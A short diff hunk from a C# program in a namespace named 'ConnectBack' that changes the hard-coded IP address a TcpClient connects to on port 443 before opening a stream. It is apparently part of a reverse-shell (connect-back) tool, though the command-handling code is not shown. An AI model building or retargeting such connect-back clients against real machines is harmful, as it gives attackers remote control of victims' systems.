@@ -16,7 +16,7 @@ namespace ConnectBack
 
 		public static void Main(string[] args)
 		{
-			using(TcpClient client = new TcpClient("172.16.9.174", 443))
+			using(TcpClient client = new TcpClient("172.16.9.192", 443))
 			{
 				using(Stream stream = client.GetStream())
 				{
